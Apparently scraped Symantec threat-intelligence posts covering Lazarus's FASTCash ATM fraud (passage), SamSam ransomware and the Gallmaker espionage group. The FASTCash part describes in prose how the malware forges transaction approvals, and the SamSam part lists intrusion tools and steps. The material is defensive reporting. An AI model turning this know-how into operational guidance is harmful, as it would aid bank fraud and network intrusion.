The result is that attempts to withdraw money via an ATM by the Lazarus attackers will be approved. Here is one example of the response logic that Trojan.Fastcash uses to generate fake responses. This particular sample has logic to construct one of three fake responses based on the incoming attacker request: For Message Type Indicator == 200 (ATM Transaction) and Point of Service Entry Mode starts with 90 (Magnetic Strip only): If Processing Code starts with 3 (Balance Inquiry): Response Code = 00 (Approved) Otherwise, if the Primary Account Number is Blacklisted by Attackers: Response Code = 55  (Invalid PIN) All other Processing Codes (with non-blacklisted PANs): Response Code = 00 (Approved) In this case, the attackers appear to have built in a capability to selectively deny transactions based on their own blacklist of account numbers. However, the capability was not implemented in this sample, and the check for blacklisting always returns “False”. Symantec has found several different variants of Trojan.Fastcash, each of which uses different response logic. We believe that each variant is tailored for a particular transaction processing network and thus has its own tailored response logic. The PAN numbers used to carry out the FASTCash attacks relate to real accounts. According to the US-CERT report, most accounts used to initiate the transactions had minimal account activity or zero balances. How the attackers gain control of these accounts remains unclear. It is possible the attackers are opening the accounts themselves and making withdrawal requests with cards issued to those accounts. Another possibility is the attackers are using stolen cards to perform the attacks. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates. Lazarus is a very active group involved in both cyber crime and espionage. Lazarus was initially known for its involvement in espionage operations and a number of high-profile disruptive attacks, includingthe 2014 attack on Sony Picturesthat saw large amounts of information being stolen and computers wiped by malware. In recent years, Lazarus has also become involved in financially motivated attacks. The group waslinked to the $81 million theft from the Bangladesh central bank in 2016, along with a number of other bank heists. Lazarus was alsolinked to the WannaCry ransomware outbreakin May 2017. WannaCry incorporated the leaked “EternalBlue” exploit that used two known vulnerabilities in Windows (CVE-2017-0144andCVE-2017-0145) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim’s network and also to other vulnerable computers connected to the internet. Within hours of its release, WannaCry had infected hundreds of thousands of computers worldwide. The recent wave of FASTCash attacks demonstrates that financially motivated attacks are not simply a passing interest for the Lazarus group and can now be considered one of its core activities. As with the 2016 series of virtual bank heists, including the Bangladesh Bank heist, FASTCash illustrates that Lazarus possesses an in-depth knowledge of banking systems and transaction processing protocols and has the expertise to leverage that knowledge in order to steal large sums from vulnerable banks. In short, Lazarus continues to pose a serious threat to the financial sector and organizations should take all necessary steps to ensure that their payment systems are fully up to date and secured. Symantec has the following detections in place to protect customers against Lazarus FASTCash attacks: Organizations should ensure that operating systems and all other software are up to date. Software updates will frequently include patches for newly discovered security vulnerabilities that could be exploited by attackers. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates.

    "title": "samsam targeted ransomware attacks",
    "link": "https://www.security.com/threat-intelligence/samsam-targeted-ransomware-attacks",
    "content": "UPDATE: November 29, 2018Two Iranian nationals have beenindicted in the U.S.for their alleged involvement in SamSam attacks. The FBI estimated that the SamSam group had received $6 million in ransom payments to date and caused over $30 million in losses to victims. The group behind the SamSam ransomware (Ransom.SamSam) has continued to mount attacks against entire organizations during 2018, with fresh attacks seen against 67 different targets, mostly located in the U.S. SamSam specializes in targeted ransomware attacks, breaking into networks and encrypting multiple computers across an organization before issuing a high-value ransom demand. The group is believed to be behind the attack on the city of Atlanta in March, which saw numerous municipal computers encrypted. The clean-up costs for the attack areexpected to run to over $10 million. The group was also linked to the attack on the Colorado Department of Transportation, whichresulted in clean-up costs of $1.5 million. During 2018, Symantec has to date found evidence of attacks against 67 different organizations. SamSam targeted organizations in a wide range of sectors, but healthcare was by far the most affected sector, accounting for 24 percent of attacks in 2018. Why healthcare was a particular focus remains unknown. The attackers may believe that healthcare organizations are easier to infect. Or they may believe that these organizations are more likely to pay the ransom. A number of local government organizations in the U.S. were also targeted by the group and at least one of these organizations is involved in administering elections. With the midterm elections in the U.S. taking place on November 6, the focus is naturally on cyber information operations and threats to voting data integrity. However, ransomware campaigns such as SamSam can also be significantly disruptive to government organizations and their operations. The vast majority of SamSam’s targets are located in the U.S. Of the 67 organizations targeted during 2018, 56 were located in the U.S. A small number of attacks were logged in Portugal, France, Australia, Ireland, and Israel. While most ransomware families are spread indiscriminately, usually via spam emails or exploit kits, SamSam is used in a targeted fashion. The SamSam group’s modus operandi is to gain access to an organization’s network, spend time performing reconnaissance by mapping out the network, before encrypting as many computers as possible and presenting the organization with a single ransom demand. The attackers have been known to offer to decrypt all computers for a set ransom and/or offer to decrypt individual machines for a lower fee. In many cases, ransom demands can run to tens of thousands of dollars to decrypt all affected computers in an organization. If successful, these attacks can have a devastating impact on victim organizations, seriously disrupting their operations, destroying business critical information, and leading to massive clean-up costs. The attackers behind SamSam go to great lengths to infect as many computers as possible in a targeted organization. Multiple software tools are used to carry out an attack and, in many cases, the entire process can take days to complete. In order to carry out its attacks, the SamSam group makes extensive use of “living off the land” tactics: the use of operating system features or legitimate network administration tools to compromise victims’ networks. These tactics are frequently used by espionage groups in order to maintain a low profile on the target’s network. By making their activity appear like legitimate processes, they hope to hide in plain sight. For example, in one attack that took place in February 2018, more than 48 hours passed between the first evidence of intrusion and the eventual encryption of hundreds of computers in the targeted organization. The first sign of an intrusion came when the attackers downloaded several hacking tools onto a computer in the targeted organization. Ten minutes later, the attackers began running scripts in order to identify and scan other computers on the organization’s network. They used PsInfo, a Microsoft Sysinternals tool that allows the user to gather information about other computers on the network. This could allow them to identify the software installed on these computers. PsInfo may have been used to identify systems with business-critical files that could be encrypted for ransom. The attackers also used the freely available hacking tool Mimikatz (Hacktool.Mimikatz) against selected computers to steal passwords. After this initial flurry of activity, the attackers returned two days later and, shortly after 5 a.m., loaded the SamSam ransomware onto the initial computer. Interestingly, two different versions of SamSam were loaded. It is likely that two versions were used in order to have an alternative at hand in case one version was detected by security software. An hour later, the attacks began executing SamSam on multiple computers across the organization’s network. This operation was carried out using PsExec, another Microsoft Sysinternals tool, which is used for executing processes on other systems. Five hours later, just under 250 computers on the network had been encrypted. SamSam continues to pose a grave threat to organizations in the U.S. The group is skilled and resourceful, capable of using tactics and tools more commonly seen in espionage attacks. A successful SamSam attack will likely be highly disruptive to any affected organizations. In the worst-case scenario, if no backups are available or if backups are encrypted by SamSam, valuable data could be permanently lost in an attack. Even if an organization does have backups, restoring affected computers and cleaning up the network will cost time and money and may lead to reputational damage. The following protections are in place to protect customers against SamSam attacks: In addition, Symantec’s Targeted Attack Analytics (TAA) is able to identify and flag “living off the land” activity associated with targeted attacks such as SamSam. To find out more about TAA, read our white paperTargeted Attack Analytics: Using Cloud-based Artificial Intelligence for Enterprise-Focused Advanced Threat Protection Backing up important data is one of the key pillars of combating ransomware infections. However, as there have been cases of ransomware encrypting backups, it should not be a replacement for a robust security strategy. Victims need to be aware that paying the ransom does not always work. Attackers may not send a decryption key, could poorly implement the decryption process and damage files, and may deliver a larger ransom demand after receiving the initial payment.

    "link": "https://www.security.com/threat-intelligence/gallmaker-attack-group",
    "content": "UPDATE October 11, 2018 This blog has been updated with a revised list of IoCs. An earlier list of IOCs attached to this blog was generated through an automated system and, due to the dual-use nature of the tools used by the group, erroneously included some low fidelity IoCs. Symantec researchers have uncovered a previously unknown attack group that is targeting government and military targets, including several overseas embassies of an Eastern European country, and military and defense targets in the Middle East. This group eschews custom malware and uses living off the land (LotL) tactics and publicly available hack tools to carry out activities that bear all the hallmarks of a cyber espionage campaign. The group, which we have given the name Gallmaker, has been operating since at least December 2017, with its most recent activity observed in June 2018. The most interesting aspect of Gallmaker’s approach is that the group doesn’t use malware in its operations.  Rather, the attack activity we observed is carried out exclusively using LotL tactics and publicly available hack tools. The group takes a number of steps to gain access to a victim’s device and then deploys several different attack tools, as follows: Gallmaker is using three primary IP addresses for its C&C infrastructure to communicate with infected devices. There is also evidence that it is deleting some of its tools from victim machines once it is finished, to hide traces of its activity. The DDE protocol can be used for legitimate purposes to send messages between Microsoft applications that share data through shared memory, e.g. to share data between Excel and Word. However, the DDE protocolwas flagged as unsecure last year, when researchers discovered it could be exploited to execute code on victim machines via Excel and Word, without macros being enabled in those applications. Microsoft said at the timethat this capability was a feature and the company did not consider it a vulnerabilitybecause Office always warned users before enabling DDE in documents, as seen in Figure 1. However, after the DDE protocol was subsequently exploited in a number of malware campaigns, Microsoft issued an update to Office in December 2017that disabled DDE by default in Word and Excel. DDE can be enabled manually after this update is applied but only if the registry is altered by an admin account. The Gallmaker victims we have seen did not have this patch installed and therefore were still vulnerable to exploit via the DDE protocol. Gallmaker’s activity appears to be highly targeted, with its victims all related to government, military, or defense sectors. Several targets are embassies of an Eastern European country. The targeted embassies are located in a number of different regions globally, but all have the same home country. The other targets we have seen are a Middle Eastern defense contractor and a military organization. There are no obvious links between the Eastern European and Middle Eastern targets, but it is clear that Gallmaker is specifically targeting the defense, military, and government sectors: its targets appear unlikely to be random or accidental. Gallmaker’s activity has been quite consistent since we started tracking it. The group has carried out attacks most months since December 2017. Its activity subsequently increased in the second quarter of 2018, with a particular spike in April 2018. Gallmaker’s activity points strongly to it being a cyber espionage campaign, likely carried out by a state-sponsored group. Gallmaker may well have continued to avoid detection were it not for Symantec’s Targeted Attack Analytics (TAA) technology. The fact that Gallmaker appears to rely exclusively on LotL tactics and publicly available hack tools makes its activities extremely hard to detect. We havewritten extensively about the increasing use of LotL toolsand publicly available hack tools by cyber criminals. One of the primary reasons for the increased popularity of these kinds of tools is to avoid detection; attackers are hoping to “hide in plain sight”, with their malicious activity hidden in a sea of legitimate processes. Gallmaker may well have continued to avoid detection were it not for Symantec’sTargeted Attack Analytics (TAA)technology. TAA combines the capabilities of Symantec’s world-leading security experts with advanced artificial intelligence and machine learning to provide organizations with their own “virtual analysts”, via our Advanced Threat Protection (ATP) product.  Since its inception, TAA has detected security incidents at thousands of organizations, automating what would have taken many hours of analyst time. In this instance, TAA identified the specific PowerShell commands used by Gallmaker as being suspicious, leading to the discovery of this new campaign.  Without TAA’s advanced AI-based capabilities, Gallmaker’s activities may well have remained undetected. The following protections are in place to protect customers against Gallmaker attacks: Network protection products also detect activity associated with Gallmaker. The following indicators are specific to Gallmaker: Gallmaker also used tools that were available in open source projects. Yara rule and methods shared below were used by Gallmaker but aren't exclusive to the group's activity. Detection of these in one's environment is only indicative of possible unauthorized activity.
